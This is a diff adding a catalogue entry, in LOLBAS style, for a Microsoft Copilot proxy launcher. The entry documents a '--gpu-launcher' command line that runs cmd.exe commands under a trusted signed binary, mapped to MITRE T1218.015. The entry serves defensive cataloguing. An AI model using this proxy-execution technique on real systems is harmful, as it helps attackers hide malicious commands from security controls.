@@ -1,0 +1,23 @@
+---
+Name: mscopilot_proxy.exe
+Description: Microsoft Copilot proxy launcher
+Author: 4n4s4zi
+Created: 2026-04-14
+Commands:
+  - Command: mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
+    Description: Copilot spawns cmd.exe as a child process of mscopilot.exe and executes the specified command (parent copilot process needs to be killed or command executes indefinitely)
+    Usecase: Executes a process under a trusted Microsoft signed binary
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.015
+    OperatingSystem: Windows 11
+    Tags:
+      - Execute: CMD
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot_proxy.exe
+Detection:
+Resources:
+  - Link: https://github.com/4n4s4zi/tour-de-mscopilot
+Acknowledgement:
+  - Person: 4n4s4zi
+    Handle: 4n4s4zi
